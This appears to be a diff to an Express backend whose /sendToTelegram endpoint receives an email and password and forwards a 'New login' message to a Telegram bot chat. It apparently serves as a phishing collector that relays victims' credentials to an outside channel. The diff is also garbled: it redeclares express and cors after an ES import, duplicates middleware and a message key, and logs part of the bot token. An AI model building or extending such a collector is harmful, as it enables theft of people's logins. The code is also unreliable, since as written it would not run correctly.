@@ -6,10 +6,24 @@ import dotenv from 'dotenv';
 dotenv.config();
 
 const app = express();
-const PORT = process.env.PORT || 4000;
+const PORT = process.env.PORT || 10000;
 
 app.use(cors());
 app.use(express.json());
+
+const express = require('express');
+const cors = require('cors');
+const axios = require('axios');
+
+
+app.use(cors());
+app.use(express.json());
+
+app.get('/', (req, res) => {
+  res.send('Backend is running');
+});
+
+
 
 app.post('/sendToTelegram', async (req, res) => {
   const { email, password } = req.body;
@@ -25,6 +39,7 @@ app.post('/sendToTelegram', async (req, res) => {
     await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       chat_id: process.env.CHAT_ID,
       text: message,
+      text: `New login: Email: ${email}, Time: ${new Date().toISOString()}`,
     });
     console.log('Telegram Token:', process.env.TELEGRAM_TOKEN?.slice(0,10) + '...');
     console.log('Chat ID:', process.env.CHAT_ID);
@@ -36,7 +51,7 @@ app.post('/sendToTelegram', async (req, res) => {
     } else {
       console.error('Error:', error.message);
     }
-    res.status(500).send("Error sending message to Telegram");
+   res.status(500).json({ success: false, error: 'Failed to send to Telegram' });
   }
 });
 
